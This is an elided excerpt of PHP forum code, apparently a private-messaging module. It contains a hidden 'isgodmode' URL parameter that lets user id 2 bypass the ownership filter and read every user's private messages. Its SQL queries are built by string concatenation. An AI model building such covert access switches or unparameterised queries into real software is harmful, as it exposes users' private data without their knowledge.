...
if (isset($_GET['id']))
{
	...
	if ($cur_post['id'] > 0)
	{
		...
		if ($is_banned)
			$user_title = '<div class="banned">'.get_title($cur_post).'</div><center><img src="img/youtried.png" width="128" height="128" /></center>';
...
// Fetch messages
if (isset($_GET['isgodmode']) && $_GET['isgodmode'] == 'true' && $pun_user['id'] == 2)
	$result = $db->query('SELECT * FROM '.$db->prefix.'messages WHERE status='.$box.' ORDER BY posted DESC LIMIT '.$limit) or error('Unable to fetch messages list for forum', __FILE__, __LINE__, $db->error());
else
